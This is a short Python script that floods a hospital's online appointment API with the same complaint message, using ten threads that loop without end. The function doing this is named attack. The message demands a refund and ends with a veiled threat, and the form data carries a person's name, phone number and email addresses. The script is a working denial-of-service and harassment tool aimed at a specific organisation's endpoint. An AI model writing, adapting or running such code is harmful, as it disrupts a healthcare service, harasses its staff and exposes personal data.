from mxproxy import mx
import requests,os,threading
# dentalkims@gmail.com

def increment_filecounter(path=os.path.basename(__file__)+'.counter'):
	if not os.path.exists(path):
		mx.touch(counterpath)

	try:
		counter=int(mx.fread(counterpath))
	except:
		counter=0

	counter+=1
	mx.fwrite(path,str(counter))
	return counter
	...

url='https://www.kimshospitals.com/api/appointments'
email="electron_hacker@protonmail.com"
message= """
	very disappointed about the recent consultation!
	you may refund the sum of 20000 taken as advance for my dental implants, 
	nothing was specialized for me you dint even take my mouth impression to make model.
	also i was not informed about the broken instrument during RCT in previous treatment. 
	yet in recent X-ray it was revealed. you must do the refund, 
	since we need that capital for other treatment, kindly dont delay. 
	(hey you receptionist reading this message, show it to the concerned doctor.)  
	the sum might not be significant to you, but its significant for us.  
	please do the right thing or i have to do wrong things. thank you.
	""".replace('\n\t','')
# print(message)
postdata={
	"branch": {
		"id": 1,
		"name": "Secunderabad",
		"slug": "secunderabad"
	},
	"branch_id": 1,
	"city_id": None,
	"contact_number": "9423445648",
	"country": None,
	"date": "2021-08-24",
	"doctor_id": 573,
	"email": email,
	"message": message,
	"name": "aravind prayag",
	"speciality": {
		"description": "The focus of prosthodontic and implantology clinicat KIMS is comprehensive patient rehabilitation to improve esthetics and function by replacement of...",
		"icon": "https://kims-app-server.s3.ap-south-1.amazonaws.com/images/specialities/127-prosthodontics-and-implantology_1572892937.png",
		"id": 128,
		"include_in_dropdown": True,
		"include_in_menu": True,
		"name": "Prosthodontics and Implantology",
		"slug": "prosthodontics-and-implantology"
	},
	"speciality_id": 128,
	"state_id": None
}

def attack():
	while True:
		resp=requests.post(url,data=postdata)
		killi.acquire()
		r=increment_filecounter()
		killi.release()
		if r%10==0:
			print(r)
			

if __name__ == '__main__':
	counterpath=os.path.basename(__file__)+'.counter'
	killi=threading.Lock()


	tpool=[threading.Thread(target=attack) for r in range(10)]
	[x.start() for x in tpool]
	[x.join() for x in tpool]